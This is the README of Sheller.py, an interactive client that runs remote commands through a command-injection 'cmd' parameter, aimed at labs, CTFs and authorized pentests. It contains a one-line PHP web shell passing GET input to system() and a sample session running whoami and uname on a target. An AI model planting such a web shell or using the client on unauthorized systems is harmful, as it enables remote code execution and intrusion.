#  Sheller.py - Interactive Web Shell Client

Sheller.py is a **Python-based interactive web shell client** designed to execute remote system commands through a **command injection vulnerability** in a web application exposing a `cmd` parameter.

⚠️ **For educational and legal purposes only** - use exclusively in authorized penetration tests, labs, or CTF environments.

---

## Features

* Interactive command-line shell
* Remote command execution via HTTP GET requests
* Clean output handling from the target server
* ANSI color support for better readability
* Graceful error handling
* Keyboard interruption handling (`Ctrl + C`)
* Built-in `exit / quit / stop` commands

---

## How It Works

The script targets a vulnerable endpoint such as:

```
https://target.com/execute.php?cmd=ls
```

Sheller.py:

1. Prompts for the target URL **up to the `cmd=` parameter**
2. Sends user-input commands to the server
3. Displays the server response in real time
4. Behaves like a lightweight remote shell

---

## Requirements

* Python 3.x
* `requests` library

Install dependencies:

```bash
pip install requests
```

---

## Usage

Run the script:

```bash
python3 sheller.py
```

You will be prompted to enter the target URL:

```text
https://example.com/execute.php?cmd=
```

Then type your commands interactively:

```bash
$ whoami
www-data

$ uname -a
Linux target 5.15.0-76-generic x86_64 GNU/Linux

$ exit
Quitting...
```

---

## Example Vulnerable Endpoint

```php
<?php
system($_GET['cmd']);
?>
```

This script assumes **no filtering or sanitization** is applied on the `cmd` parameter.

---

## Disclaimer

This tool is provided **for educational purposes only**.
The author is **not responsible** for any misuse or damage caused by this script.

[!] Use it **only** on systems you own or have **explicit authorization** to test. [!]

---

## Author

**Ilyas YAHIA-CHERIF**
Cybersecurity student | Red Team enthusiast
GitHub: *https://github.com/l1yas*
